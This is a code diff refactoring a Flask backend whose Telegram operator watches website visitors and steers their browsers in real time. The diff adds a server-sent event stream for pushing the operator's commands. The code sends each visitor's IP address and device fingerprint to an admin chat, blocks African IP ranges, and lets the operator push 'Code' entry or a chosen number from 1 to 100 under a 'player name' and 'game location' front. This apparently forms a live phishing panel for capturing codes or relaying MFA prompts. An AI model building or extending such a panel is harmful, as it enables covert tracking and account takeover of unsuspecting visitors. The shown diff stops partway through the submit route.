@@ -1,6 +1,6 @@
 import ipaddress
-import ipaddress
 import os
+import queue
 import threading
 import time
 from concurrent.futures import ThreadPoolExecutor
@@ -8,7 +8,7 @@ from datetime import datetime, timedelta, timezone
 from typing import Any
 
 from dotenv import load_dotenv
-from flask import Flask, jsonify, request, send_from_directory
+from flask import Flask, Response, jsonify, request, send_from_directory
 import requests
 
 ROOT = os.path.dirname(os.path.abspath(__file__))
@@ -22,38 +22,32 @@ app.config["PERMANENT_SESSION_LIFETIME"] = timedelta(days=7)
 
 # ──────────────────────────────────────────────────────────────────────────────
 # Thread-pools
-#   tg_pool   – exclusively for Telegram API calls (answerCallbackQuery must be
-#               fast; never let it queue behind slow operations)
-#   bg_pool   – general background work (geo-IP lookups, visit messages, etc.)
 # ──────────────────────────────────────────────────────────────────────────────
 tg_pool = ThreadPoolExecutor(max_workers=8, thread_name_prefix="tg")
 bg_pool = ThreadPoolExecutor(max_workers=4, thread_name_prefix="bg")
 
 # ──────────────────────────────────────────────────────────────────────────────
-# HTTP sessions
-#
-# Two separate sessions so the long-poll connection is NEVER shared with any
-# other outbound call. If tg_pool threads use `http` while the poll loop is
-# mid-request, urllib3's connection pool can stall the poll.  Keeping them
-# completely isolated means Telegram can interrupt the long-poll instantly
-# the moment an update (e.g. Accept) arrives.
+# HTTP sessions – poll_http is EXCLUSIVELY for the long-poll loop thread so
+# no other outbound call can ever stall it via connection-pool contention.
 # ──────────────────────────────────────────────────────────────────────────────
-proxy_url = (
+_proxy = (
     os.environ.get("http_proxy")
     or os.environ.get("https_proxy")
     or os.environ.get("HTTP_PROXY")
 )
-if not proxy_url and os.path.exists("/etc/pythonanywhere"):
-    proxy_url = "http://proxy.server:3128"
+if not _proxy and os.path.exists("/etc/pythonanywhere"):
+    _proxy = "http://proxy.server:3128"
 
-def _make_session() -> requests.Session:
+
+def _make_http() -> requests.Session:
     s = requests.Session()
-    if proxy_url:
-        s.proxies = {"http": proxy_url, "https": proxy_url}
+    if _proxy:
+        s.proxies = {"http": _proxy, "https": _proxy}
     return s
 
-http      = _make_session()   # used by tg_pool workers, bg_pool, geo-IP
-poll_http = _make_session()   # used EXCLUSIVELY by the telegram_loop thread
+
+http      = _make_http()   # tg_pool workers, bg_pool, geo-IP
+poll_http = _make_http()   # telegram_loop ONLY
 
 # ──────────────────────────────────────────────────────────────────────────────
 # Session store
@@ -62,216 +56,229 @@ state_lock = threading.Lock()
 sessions: dict[str, dict[str, Any]] = {}
 
 # ──────────────────────────────────────────────────────────────────────────────
-# Update-deduplication guard (avoid processing the same update_id twice if the
-# polling thread restarts or overlaps)
+# SSE broadcaster
+#
+# Each connected browser tab registers a Queue here.  When state changes
+# (operator presses Accept / Number / Code / Decline) we push a JSON event
+# into every queue whose session-id matches.  The SSE generator drains its
+# queue and streams the event to the browser immediately — zero polling delay.
 # ──────────────────────────────────────────────────────────────────────────────
-_seen_lock = threading.Lock()
-_seen_update_ids: set[int] = set()
-_SEEN_MAX = 500  # rolling window – keep memory bounded
+_sse_lock = threading.Lock()
+# { sid -> [queue, queue, ...] }  (multiple tabs per session are fine)
+_sse_listeners: dict[str, list[queue.Queue]] = {}
+
+
+def _sse_subscribe(sid: str) -> "queue.Queue[str | None]":
+    q: queue.Queue[str | None] = queue.Queue(maxsize=32)
+    with _sse_lock:
+        _sse_listeners.setdefault(sid, []).append(q)
+    return q
+
+
+def _sse_unsubscribe(sid: str, q: "queue.Queue") -> None:
+    with _sse_lock:
+        listeners = _sse_listeners.get(sid, [])
+        try:
+            listeners.remove(q)
+        except ValueError:
+            pass
+        if not listeners:
+            _sse_listeners.pop(sid, None)
+
+
+def _sse_push(sid: str, data: dict[str, Any]) -> None:
+    """Push a state snapshot to every browser tab listening on `sid`."""
+    import json as _json
+    payload = f"data: {_json.dumps(data)}\n\n"
+    with _sse_lock:
+        listeners = list(_sse_listeners.get(sid, []))
+    for q in listeners:
+        try:
+            q.put_nowait(payload)
+        except queue.Full:
+            pass  # slow consumer – drop; they'll fall back to the REST poll
+
 
 # ──────────────────────────────────────────────────────────────────────────────
-# Geo-IP cache
+# Update-dedup guard
+# ──────────────────────────────────────────────────────────────────────────────
+_seen_lock = threading.Lock()
+_seen_ids: set[int] = set()
+_SEEN_MAX = 500
+
+
+# ──────────────────────────────────────────────────────────────────────────────
+# Geo-IP
 # ──────────────────────────────────────────────────────────────────────────────
 ip_cache_lock = threading.Lock()
 ip_geo_cache: dict[str, bool] = {}
 
-AFRICAN_COUNTRY_CODES = {
-    "AO", "BF", "BI", "BJ", "BW", "CD", "CF", "CG", "CI", "CM", "CV", "DJ", "DZ",
-    "EG", "ER", "ET", "GA", "GH", "GM", "GN", "GQ", "GW", "KE", "KM", "LR", "LS",
-    "LY", "MA", "MG", "ML", "MR", "MU", "MW", "MZ", "NA", "NE", "NG", "RW", "SC",
-    "SD", "SL", "SN", "SO", "SS", "ST", "SZ", "TD", "TG", "TN", "TZ", "UG", "ZA",
-    "ZM", "ZW", "EH",
+AFRICAN_CC = {
+    "AO","BF","BI","BJ","BW","CD","CF","CG","CI","CM","CV","DJ","DZ",
+    "EG","ER","ET","GA","GH","GM","GN","GQ","GW","KE","KM","LR","LS",
+    "LY","MA","MG","ML","MR","MU","MW","MZ","NA","NE","NG","RW","SC",
+    "SD","SL","SN","SO","SS","ST","SZ","TD","TG","TN","TZ","UG","ZA",
+    "ZM","ZW","EH",
 }
 
 
-# ──────────────────────────────────────────────────────────────────────────────
-# Helpers
-# ──────────────────────────────────────────────────────────────────────────────
-
-def is_private_or_local_ip(ip_str: str) -> bool:
+def _is_private(ip: str) -> bool:
     try:
-        ip_obj = ipaddress.ip_address(ip_str)
-        return ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_link_local
+        o = ipaddress.ip_address(ip)
+        return o.is_private or o.is_loopback or o.is_link_local
     except ValueError:
         return False
 
 
-def is_african_ip(ip_str: str) -> bool:
-    if not ip_str or ip_str in ("Unknown", "127.0.0.1", "::1"):
+def is_african_ip(ip: str) -> bool:
+    if not ip or ip in ("Unknown", "127.0.0.1", "::1"):
         return False
-    if is_private_or_local_ip(ip_str):
+    if _is_private(ip):
         return False
-
     with ip_cache_lock:
-        if ip_str in ip_geo_cache:
-            return ip_geo_cache[ip_str]
-
-    is_af = False
+        if ip in ip_geo_cache:
+            return ip_geo_cache[ip]
+    result = False
     for url in (
-        f"http://ip-api.com/json/{ip_str}?fields=status,countryCode,continentCode",
-        f"https://ipapi.co/{ip_str}/json/",
+        f"http://ip-api.com/json/{ip}?fields=status,countryCode,continentCode",
+        f"https://ipapi.co/{ip}/json/",
     ):
         try:
-            res = http.get(url, timeout=3)
-            if res.status_code == 200:
-                data = res.json()
-                cont = str(data.get("continentCode") or data.get("continent_code") or "").upper()
-                cc = str(data.get("countryCode") or data.get("country_code") or "").upper()
-                if data.get("status", "success") == "success" or "continent_code" in data:
-                    is_af = (cont == "AF") or (cc in AFRICAN_COUNTRY_CODES)
+            r = http.get(url, timeout=3)
+            if r.status_code == 200:
+                d = r.json()
+                cont = str(d.get("continentCode") or d.get("continent_code") or "").upper()
+                cc   = str(d.get("countryCode")   or d.get("country_code")   or "").upper()
+                if d.get("status", "success") == "success" or "continent_code" in d:
+                    result = cont == "AF" or cc in AFRICAN_CC
                     with ip_cache_lock:
-                        ip_geo_cache[ip_str] = is_af
-                    return is_af
-        except Exception as exc:
-            print(f"[geo] lookup error for {ip_str} via {url}: {exc}")
-
+                        ip_geo_cache[ip] = result
+                    return result
+        except Exception as e:
+            print(f"[geo] {ip}: {e}")
     return False
 
 
-def is_ngrok_request() -> bool:
-    host = (request.headers.get("X-Forwarded-Host") or request.host or "").lower()
+def is_ngrok() -> bool:
+    host    = (request.headers.get("X-Forwarded-Host") or request.host or "").lower()
     referer = (request.headers.get("Referer") or "").lower()
-    ua = (request.headers.get("User-Agent") or "").lower()
+    ua      = (request.headers.get("User-Agent") or "").lower()
     return "ngrok" in host or "ngrok" in referer or "ngrok" in ua
 
 
-def get_timestamp() -> str:
+def ts() -> str:
     return datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
 
 
-def keyboard(rows: list[list[dict[str, str]]]) -> dict[str, Any]:
+# ──────────────────────────────────────────────────────────────────────────────
+# Telegram helpers
+# ──────────────────────────────────────────────────────────────────────────────
+def kb(rows: list[list[dict[str, str]]]) -> dict:
     return {"inline_keyboard": rows}
 
 
-def control_keyboard(sid: str) -> dict[str, Any]:
-    return keyboard([
-        [
-            {"text": "🔢 Number", "callback_data": f"mode:number:{sid}"},
-            {"text": "🔑 Code",   "callback_data": f"mode:code:{sid}"},
-        ]
-    ])
+def control_kb(sid: str) -> dict:
+    return kb([[
+        {"text": "🔢 Number", "callback_data": f"mode:number:{sid}"},
+        {"text": "🔑 Code",   "callback_data": f"mode:code:{sid}"},
+    ]])
 
 
-def number_keyboard(sid: str) -> dict[str, Any]:
-    buttons = [
-        {"text": str(n), "callback_data": f"number:{n}:{sid}"}
-        for n in range(1, 101)
-    ]
-    rows = [buttons[i: i + 8] for i in range(0, 100, 8)]
-    return keyboard(rows)
+def number_kb(sid: str) -> dict:
+    btns = [{"text": str(n), "callback_data": f"number:{n}:{sid}"} for n in range(1, 101)]
+    return kb([btns[i:i+8] for i in range(0, 100, 8)])
 
 
-# ──────────────────────────────────────────────────────────────────────────────
-# Telegram API wrapper
-# ──────────────────────────────────────────────────────────────────────────────
-
-def telegram_request(
-    method: str,
-    payload: dict[str, Any],
-    timeout: int = 35,
-    silent_conflict: bool = False,
-) -> dict[str, Any]:
+def tg_call(method: str, payload: dict, timeout: int = 35,
+            silent_409: bool = False, use_poll_http: bool = False) -> dict:
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
+    sess = poll_http if use_poll_http else http
     try:
-        resp = http.post(url, json=payload, timeout=timeout)
-        resp.raise_for_status()
-        result = resp.json()
-        if not result.get("ok"):
-            raise RuntimeError(result.get("description", "Telegram API error"))
-        return result
-    except Exception as exc:
-        if not (silent_conflict and "409" in str(exc)):
-            print(f"[tg] {method} error: {exc}")
+        r = sess.post(url, json=payload, timeout=timeout)
+        r.raise_for_status()
+        data = r.json()
+        if not data.get("ok"):
+            raise RuntimeError(data.get("description", "Telegram error"))
+        return data
+    except Exception as e:
+        if not (silent_409 and "409" in str(e)):
+            print(f"[tg] {method}: {e}")
         raise
 
 
-def tg_async(method: str, payload: dict[str, Any], **kwargs: Any) -> None:
-    """Fire-and-forget Telegram call on the dedicated tg_pool."""
-    tg_pool.submit(telegram_request, method, payload, **kwargs)
+def tg_async(method: str, payload: dict, **kw) -> None:
+    tg_pool.submit(tg_call, method, payload, **kw)
 
 
 # ──────────────────────────────────────────────────────────────────────────────
 # Session helpers
 # ──────────────────────────────────────────────────────────────────────────────
-
-def get_session_id() -> str:
-    sid = (
-        request.headers.get("X-Session-ID")
-        or request.args.get("sid")
-        or "default_session"
-    )
+def get_sid() -> str:
+    sid = (request.headers.get("X-Session-ID")
+           or request.args.get("sid")
+           or "default_session")
     return str(sid).strip()[:64]
 
 
-def _default_session(sid: str) -> dict[str, Any]:
+def _blank(sid: str) -> dict:
     return {
-        "id": sid,
-        "status": "idle",
-        "mode": None,
-        "number": None,
-        "player_name": "",
-        "game_location": "",
-        "visited": False,
-        "client_ip": "",
-        "user_agent": "",
+        "id": sid, "status": "idle", "mode": None, "number": None,
+        "player_name": "", "game_location": "",
+        "visited": False, "client_ip": "", "user_agent": "",
         "updated_at": time.time(),
     }
 
 
-def get_or_create_session(sid: str) -> dict[str, Any]:
+def get_or_create(sid: str) -> dict:
     with state_lock:
         if sid not in sessions:
-            sessions[sid] = _default_session(sid)
+            sessions[sid] = _blank(sid)
         else:
             sessions[sid]["updated_at"] = time.time()
         return dict(sessions[sid])
 
 
-def set_session_state(sid: str, **updates: Any) -> dict[str, Any]:
+def set_state(sid: str, **kw) -> dict:
     with state_lock:
         if sid not in sessions:
-            sessions[sid] = _default_session(sid)
-        sessions[sid].update(updates)
+            sessions[sid] = _blank(sid)
+        sessions[sid].update(kw)
         sessions[sid]["updated_at"] = time.time()
-        return dict(sessions[sid])
+        snap = dict(sessions[sid])
+    # Push to all SSE listeners for this session immediately
+    _sse_push(sid, snap)
+    return snap
 
 
-def cleanup_expired_sessions() -> None:
-    cutoff = time.time() - (7 * 86400)
+def cleanup() -> None:
+    cutoff = time.time() - 7 * 86400
     with state_lock:
-        expired = [k for k, v in sessions.items() if v.get("updated_at", 0) < cutoff]
-        for k in expired:
+        dead = [k for k, v in sessions.items() if v.get("updated_at", 0) < cutoff]
+        for k in dead:
             del sessions[k]
 
 
 # ──────────────────────────────────────────────────────────────────────────────
 # Flask middleware
 # ──────────────────────────────────────────────────────────────────────────────
-
 @app.before_request
-def block_african_ips() -> Any:
+def gate() -> Any:
     if request.method == "OPTIONS":
         return None
-    if request.endpoint in ("telegram_webhook", "access_diagnostic") or is_ngrok_request():
+    if request.endpoint in ("telegram_webhook", "access_diag") or is_ngrok():
         return None
-    client_ip = (
-        request.headers.get("X-Forwarded-For", request.remote_addr or "Unknown")
-        .split(",")[0]
-        .strip()
-    )
-    if is_african_ip(client_ip):
-        return jsonify({
-            "error": "Access denied. This service is not available in your region.",
-            "blocked": True,
-        }), 403
+    ip = (request.headers.get("X-Forwarded-For", request.remote_addr or "")
+          .split(",")[0].strip())
+    if is_african_ip(ip):
+        return jsonify({"error": "Access denied. Not available in your region.", "blocked": True}), 403
 
 
 @app.after_request
-def add_cors_headers(response: Any) -> Any:
-    response.headers["Access-Control-Allow-Origin"] = "*"
-    response.headers["Access-Control-Allow-Headers"] = "Content-Type, Authorization, X-Session-ID"
-    response.headers["Access-Control-Allow-Methods"] = "GET, POST, OPTIONS"
-    return response
+def cors(resp: Any) -> Any:
+    resp.headers["Access-Control-Allow-Origin"]  = "*"
+    resp.headers["Access-Control-Allow-Headers"] = "Content-Type, Authorization, X-Session-ID"
+    resp.headers["Access-Control-Allow-Methods"] = "GET, POST, OPTIONS"
+    return resp
 
 
 @app.route("/api/<path:path>", methods=["OPTIONS"])
@@ -282,203 +289,140 @@ def options_handler(path: str) -> Any:
 # ──────────────────────────────────────────────────────────────────────────────
 # Telegram update handler
 # ──────────────────────────────────────────────────────────────────────────────
-
 def _resolve_sid(parts: list[str], cmd: str) -> str | None:
-    """Extract session-id from callback_data parts and validate it exists."""
-    sid: str | None = None
+    sid = None
     if cmd in ("accept", "decline") and len(parts) > 1:
         sid = parts[1]
     elif cmd in ("mode", "number") and len(parts) > 2:
         sid = parts[2]
-
     with state_lock:
         if sid and sid in sessions:
             return sid
-        # Fallback: use the most-recently-active session.
-        # Only safe when there is exactly one active session.
         if sessions:
             return max(sessions, key=lambda k: sessions[k].get("updated_at", 0))
-
     return None
 
 
-def handle_update(update: dict[str, Any]) -> None:
-    # ── deduplication ──────────────────────────────────────────────────────
-    update_id: int = update.get("update_id", -1)
-    if update_id >= 0:
+def handle_update(update: dict) -> None:
+    uid = update.get("update_id", -1)
+    if uid >= 0:
         with _seen_lock:
-            if update_id in _seen_update_ids:
+            if uid in _seen_ids:
                 return
-            _seen_update_ids.add(update_id)
-            if len(_seen_update_ids) > _SEEN_MAX:
-                # drop the oldest half to keep the set bounded
-                oldest = sorted(_seen_update_ids)[: _SEEN_MAX // 2]
-                for oid in oldest:
-                    _seen_update_ids.discard(oid)
+            _seen_ids.add(uid)
+            if len(_seen_ids) > _SEEN_MAX:
+                for old in sorted(_seen_ids)[:_SEEN_MAX // 2]:
+                    _seen_ids.discard(old)
 
-    callback = update.get("callback_query")
-    if not callback:
+    cb = update.get("callback_query")
+    if not cb:
         return
 
-    message = callback.get("message", {})
-    chat_id = str(message.get("chat", {}).get("id", "")).strip()
-
-    # Only process callbacks from the admin chat
+    msg     = cb.get("message", {})
+    chat_id = str(msg.get("chat", {}).get("id", "")).strip()
     if chat_id != str(ADMIN_CHAT_ID).strip():
         return
 
-    action = callback.get("data", "")
-    callback_id = callback.get("id")
-    message_id = message.get("message_id")
-    parts = action.split(":")
-    cmd = parts[0]
+    action      = cb.get("data", "")
+    cb_id       = cb.get("id")
+    message_id  = msg.get("message_id")
+    parts       = action.split(":")
+    cmd         = parts[0]
 
-    # ── Answer the callback async – never block the polling thread ──────
-    # answerCallbackQuery only controls the spinner on the operator's screen.
-    # Firing it async means the state update below happens in microseconds,
-    # so the player's browser sees the change on the very next poll.
-    # The operator's button will clear within ~1 s in the background.
-    if callback_id:
-        tg_async(
-            "answerCallbackQuery",
-            {"callback_query_id": callback_id, "text": "✅ Done"},
-            timeout=10,
-            silent_conflict=True,
-        )
+    # Answer the Telegram callback async (just clears the spinner on operator's
+    # phone). State update happens synchronously below – zero extra latency.
+    if cb_id:
+        tg_async("answerCallbackQuery",
+                 {"callback_query_id": cb_id, "text": "✅"},
+                 timeout=8, silent_409=True)
 
-    sid = _resolve_sid(parts, cmd)
-    if not sid:
-        sid = "default_session"
+    sid = _resolve_sid(parts, cmd) or "default_session"
 
-    # ── State transitions ─────────────────────────────────────────────────
     if cmd == "accept":
-        set_session_state(sid, status="accepted", mode=None, number=None)
+        set_state(sid, status="accepted", mode=None, number=None)
         if message_id:
-            tg_async(
-                "editMessageReplyMarkup",
-                {"chat_id": chat_id, "message_id": message_id, "reply_markup": control_keyboard(sid)},
-                silent_conflict=True,
-            )
+            tg_async("editMessageReplyMarkup",
+                     {"chat_id": chat_id, "message_id": message_id,
+                      "reply_markup": control_kb(sid)}, silent_409=True)
 
     elif cmd == "decline":
-        set_session_state(sid, status="declined", mode=None, number=None)
+        set_state(sid, status="declined", mode=None, number=None)
         if message_id:
-            tg_async(
-                "editMessageText",
-                {"chat_id": chat_id, "message_id": message_id, "text": "❌ Session Declined."},
-                silent_conflict=True,
-            )
+            tg_async("editMessageText",
+                     {"chat_id": chat_id, "message_id": message_id,
+                      "text": "❌ Session declined."}, silent_409=True)
 
     elif cmd == "mode" and len(parts) > 1:
-        selected_mode = parts[1]  # "number" or "code"
-        if selected_mode == "number":
-            set_session_state(sid, status="accepted", mode="number", number=None)
+        mode = parts[1]
+        if mode == "number":
+            set_state(sid, status="accepted", mode="number", number=None)
             if message_id:
-                tg_async(
-                    "editMessageReplyMarkup",
-                    {"chat_id": chat_id, "message_id": message_id, "reply_markup": number_keyboard(sid)},
-                    silent_conflict=True,
-                )
-        elif selected_mode == "code":
-            set_session_state(sid, status="accepted", mode="code", number=None)
+                tg_async("editMessageReplyMarkup",
+                         {"chat_id": chat_id, "message_id": message_id,
+                          "reply_markup": number_kb(sid)}, silent_409=True)
+        elif mode == "code":
+            set_state(sid, status="accepted", mode="code", number=None)
             if message_id:
-                tg_async(
-                    "editMessageText",
-                    {
-                        "chat_id": chat_id,
-                        "message_id": message_id,
-                        "text": "✅ Mode: Code Entry active. Waiting for the player to enter their code.",
-                    },
-                    silent_conflict=True,
-                )
+                tg_async("editMessageText",
+                         {"chat_id": chat_id, "message_id": message_id,
+                          "text": "✅ Code mode active – waiting for player."}, silent_409=True)
 
     elif cmd == "number" and len(parts) > 2:
         try:
-            num_val = int(parts[1])
+            n = int(parts[1])
         except ValueError:
             return
-        set_session_state(sid, status="accepted", mode="number", number=num_val)
+        set_state(sid, status="accepted", mode="number", number=n)
         if message_id:
-            tg_async(
-                "editMessageText",
-                {"chat_id": chat_id, "message_id": message_id, "text": f"✅ Number selected: {num_val}"},
-                silent_conflict=True,
-            )
+            tg_async("editMessageText",
+                     {"chat_id": chat_id, "message_id": message_id,
+                      "text": f"✅ Number: {n}"}, silent_409=True)
 
 
 # ──────────────────────────────────────────────────────────────────────────────
 # Telegram long-poll loop
-#
-# Key design choices:
-#   • poll_http is a DEDICATED session – never shared with tg_pool workers.
-#     This prevents urllib3 connection-pool contention from stalling the poll.
-#   • timeout=20  — Telegram holds the connection open; updates arrive the
-#     instant the operator presses a button (sub-second delivery).
-#   • answerCallbackQuery fires on tg_pool (async) so state is updated on the
-#     polling thread in microseconds – browser sees it on the very next poll.
-#   • sleep(0) after results, sleep(0.05) on empty – no unnecessary delay.
+# poll_http is dedicated so nothing can stall it via connection-pool sharing.
+# timeout=20 means Telegram holds the HTTP connection open and returns the
+# moment a button is pressed – delivery is essentially instantaneous.
 # ──────────────────────────────────────────────────────────────────────────────
-
-def _poll_request(method: str, payload: dict[str, Any], timeout: int = 35) -> dict[str, Any]:
-    """Telegram API call that uses the dedicated poll_http session."""
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
-    resp = poll_http.post(url, json=payload, timeout=timeout)
-    resp.raise_for_status()
-    result = resp.json()
-    if not result.get("ok"):
-        raise RuntimeError(result.get("description", "Telegram API error"))
-    return result
-
-
 def telegram_loop() -> None:
-    # Clear any lingering webhook so long-polling works exclusively
     for attempt in range(3):
         try:
-            _poll_request("deleteWebhook", {"drop_pending_updates": False}, timeout=15)
-            print("[tg] Webhook cleared – long-poll mode active.")
+            tg_call("deleteWebhook", {"drop_pending_updates": False},
+                    timeout=15, use_poll_http=True)
+            print("[tg] webhook cleared – long-poll active")
             break
-        except Exception as exc:
-            print(f"[tg] deleteWebhook attempt {attempt + 1} failed: {exc}")
+        except Exception as e:
+            print(f"[tg] deleteWebhook attempt {attempt+1}: {e}")
             time.sleep(2)
 
     offset = 0
-    consecutive_errors = 0
-
+    errs   = 0
     while True:
         try:
-            cleanup_expired_sessions()
-
-            result = _poll_request(
+            cleanup()
+            res = tg_call(
                 "getUpdates",
-                {
-                    "offset": offset,
-                    "timeout": 20,           # long-poll: Telegram holds connection up to 20s
-                    "allowed_updates": ["callback_query"],
-                },
-                timeout=25,                  # HTTP timeout must be > Telegram timeout
+                {"offset": offset, "timeout": 20, "allowed_updates": ["callback_query"]},
+                timeout=25, use_poll_http=True,
             )
-
-            updates = result.get("result", [])
-            for update in updates:
-                offset = update["update_id"] + 1
+            updates = res.get("result", [])
+            for u in updates:
+                offset = u["update_id"] + 1
                 try:
-                    handle_update(update)
-                except Exception as exc:
-                    print(f"[tg] handle_update error: {exc}")
-
-            consecutive_errors = 0
-            # Re-poll immediately if there were results; tiny pause otherwise
+                    handle_update(u)
+                except Exception as e:
+                    print(f"[tg] handle_update: {e}")
+            errs = 0
             time.sleep(0 if updates else 0.05)
-
-        except Exception as exc:
-            consecutive_errors += 1
-            err_str = str(exc)
-            if "409" in err_str:
-                print("[tg] 409 Conflict – another instance polling. Backing off 10s.")
+        except Exception as e:
+            errs += 1
+            if "409" in str(e):
+                print("[tg] 409 conflict – backing off 10s")
                 time.sleep(10)
             else:
-                wait = min(2 ** consecutive_errors, 30)
-                print(f"[tg] getUpdates error (#{consecutive_errors}): {exc} – retrying in {wait}s")
+                wait = min(2 ** errs, 30)
+                print(f"[tg] getUpdates error #{errs}: {e} – retry in {wait}s")
                 time.sleep(wait)
 
 
@@ -489,10 +433,10 @@ def telegram_loop() -> None:
 @app.route("/telegram-webhook", methods=["POST", "GET"])
 def telegram_webhook() -> Any:
     if request.method == "GET":
-        return jsonify({"ok": True, "message": "Telegram Webhook Endpoint Ready"})
-    update = request.get_json(silent=True) or {}
-    if update:
-        handle_update(update)
+        return jsonify({"ok": True})
+    u = request.get_json(silent=True) or {}
+    if u:
+        handle_update(u)
     return jsonify({"ok": True})
 
 
@@ -501,147 +445,152 @@ def index() -> Any:
     return send_from_directory(ROOT, "index.html")
 
 
-@app.route("/access", methods=["GET", "OPTIONS"])
-def access_diagnostic() -> Any:
-    if request.method == "OPTIONS":
-        return "", 200
-    token_preview = (
-        f"{BOT_TOKEN[:6]}...{BOT_TOKEN[-4:]}" if len(BOT_TOKEN) > 10
-        else ("NOT SET" if not BOT_TOKEN else BOT_TOKEN)
-    )
+@app.route("/access", methods=["GET"])
+def access_diag() -> Any:
+    preview = (f"{BOT_TOKEN[:6]}...{BOT_TOKEN[-4:]}" if len(BOT_TOKEN) > 10
+               else ("NOT SET" if not BOT_TOKEN else BOT_TOKEN))
     return jsonify({
         "status": "online",
         "telegram_configured": bool(BOT_TOKEN and ADMIN_CHAT_ID),
-        "bot_token_preview": token_preview,
+        "bot_token_preview": preview,
         "admin_chat_id": ADMIN_CHAT_ID or "NOT SET",
         "active_sessions": len(sessions),
-        "server_time_utc": get_timestamp(),
+        "sse_listeners": {k: len(v) for k, v in _sse_listeners.items()},
+        "server_time_utc": ts(),
     })
+
+
+# ── SSE stream ─────────────────────────────────────────────────────────────
+# The browser opens GET /api/stream and keeps the connection alive.
+# When state changes (operator press) set_state() calls _sse_push() which
+# puts the new snapshot into this session's queue.  The generator drains it
+# and streams "data: {...}\n\n" to the browser within milliseconds.
+# A keepalive comment (": ping\n\n") is sent every 15 s so proxies and
+# Render's load balancer don't close idle connections.
+# ──────────────────────────────────────────────────────────────────────────────
+@app.get("/api/stream")
+def sse_stream() -> Response:
+    sid = get_sid()
+    q   = _sse_subscribe(sid)
+    # Send current state immediately so the browser is in sync on connect
+    current = get_or_create(sid)
+
+    def generate():
+        import json as _json
+        try:
+            # Immediate snapshot on connect
+            yield f"data: {_json.dumps(current)}\n\n"
+            while True:
+                try:
+                    # Block up to 15 s waiting for a pushed event
+                    msg = q.get(timeout=15)
+                    if msg is None:          # sentinel – close stream
+                        return
+                    yield msg
+                except queue.Empty:
+                    # No event in 15 s → send a keepalive comment
+                    yield ": ping\n\n"
+        finally:
+            _sse_unsubscribe(sid, q)
+
+    resp = Response(generate(), mimetype="text/event-stream")
+    resp.headers["Cache-Control"]        = "no-cache"
+    resp.headers["X-Accel-Buffering"]    = "no"   # disable Nginx buffering
+    resp.headers["Access-Control-Allow-Origin"] = "*"
+    return resp
+
+
+@app.get("/api/session")
+def get_session_route() -> Any:
+    sid  = get_sid()
+    data = get_or_create(sid)
+    resp = jsonify(data)
+    resp.headers["Cache-Control"] = "no-store"
+    return resp
+
+
+@app.post("/api/heartbeat")
+def heartbeat() -> Any:
+    sid  = get_sid()
+    data = get_or_create(sid)
+    return jsonify({"ok": True, "status": data["status"],
+                    "mode": data["mode"], "number": data["number"]})
 
 
 @app.route("/api/visit", methods=["POST", "OPTIONS"])
 def record_visit() -> Any:
     if request.method == "OPTIONS":
         return "", 200
-
-    sid = get_session_id()
-    sess = get_or_create_session(sid)
-
+    sid  = get_sid()
+    sess = get_or_create(sid)
     if sess.get("visited"):
         return jsonify({"ok": True, "already_logged": True})
+    set_state(sid, visited=True)
 
-    set_session_state(sid, visited=True)
-
-    payload = request.get_json(silent=True) or {}
-    client_ip = (
-        request.headers.get("X-Forwarded-For", request.remote_addr or "Unknown")
-        .split(",")[0].strip()
-    )
-    ua = request.headers.get("User-Agent", "Unknown")
-    accept_lang = request.headers.get("Accept-Language", "Unknown")
-    referer = request.headers.get("Referer") or payload.get("referrer") or "Direct / None"
-
-    ci = payload.get("clientInfo", {})
-    ts = get_timestamp()
+    body = request.get_json(silent=True) or {}
+    ip   = (request.headers.get("X-Forwarded-For", request.remote_addr or "")
+            .split(",")[0].strip())
+    ua   = request.headers.get("User-Agent", "Unknown")
+    lang = request.headers.get("Accept-Language", "Unknown")
+    ref  = request.headers.get("Referer") or body.get("referrer") or "Direct"
+    ci   = body.get("clientInfo", {})
 
     if BOT_TOKEN and ADMIN_CHAT_ID:
         text = (
-            "👀 New Website Visit\n\n"
-            f"⏰ Time: {ts}\n"
-            f"🔗 Referrer: {referer}\n\n"
-            "🌐 Client Details:\n"
-            f"• IP: {client_ip}\n"
-            f"• UA: {ua}\n"
-            f"• Language: {ci.get('language', accept_lang)}\n"
-            f"• Screen: {ci.get('screen', 'Unknown')}\n"
-            f"• Timezone: {ci.get('timezone', 'Unknown')}\n"
-            f"• Platform: {ci.get('platform', 'Unknown')}"
+            f"👀 New Visit\n\n⏰ {ts()}\n🔗 {ref}\n\n"
+            f"• IP: {ip}\n• UA: {ua}\n"
+            f"• Lang: {ci.get('language', lang)}\n"
+            f"• Screen: {ci.get('screen','?')}\n"
+            f"• TZ: {ci.get('timezone','?')}\n"
+            f"• Platform: {ci.get('platform','?')}"
         )
-        bg_pool.submit(telegram_request, "sendMessage", {"chat_id": ADMIN_CHAT_ID, "text": text})
-
+        bg_pool.submit(tg_call, "sendMessage", {"chat_id": ADMIN_CHAT_ID, "text": text})
     return jsonify({"ok": True})
-
-
-@app.get("/api/session")
-def get_session_route() -> Any:
-    sid = get_session_id()
-    data = get_or_create_session(sid)
-    resp = jsonify(data)
-    resp.headers["Cache-Control"] = "no-store, no-cache, must-revalidate"
-    return resp
-
-
-@app.post("/api/heartbeat")
-def heartbeat() -> Any:
-    sid = get_session_id()
-    data = get_or_create_session(sid)
-    return jsonify({"ok": True, "status": data["status"], "mode": data["mode"], "number": data["number"]})
 
 
 @app.route("/api/submit", methods=["POST", "OPTIONS"])
 def submit() -> Any:
     if request.method == "OPTIONS":
         return "", 200
-
-    payload = request.get_json(silent=True) or {}
-    player_name = str(payload.get("playerName", "")).strip()[:40]
-    game_location = str(payload.get("gameLocation", "")).strip()[:80]
-
-    if not player_name or not game_location:
+    body  = request.get_json(silent=True) or {}
+    name  = str(body.get("playerName", "")).strip()[:40]
+    loc   = str(body.get("gameLocation", "")).strip()[:80]
+    if not name or not loc:
         return jsonify({"error": "Player name and game location are required."}), 400
     if not BOT_TOKEN or not ADMIN_CHAT_ID:
-        return jsonify({"error": "Telegram is not configured."}), 503
+        return jsonify({"error": "Telegram not configured."}), 503
 
-    sid = get_session_id()
-    client_ip = (
-        request.headers.get("X-Forwarded-For", request.remote_addr or "Unknown")
-        .split(",")[0].strip()
-    )
-    ua = request.headers.get("User-Agent", "Unknown")
-    accept_lang = request.headers.get("Accept-Language", "Unknown")
-    ci = payload.get("clientInfo", {})
-    ts = get_timestamp()
+    sid  = get_sid()
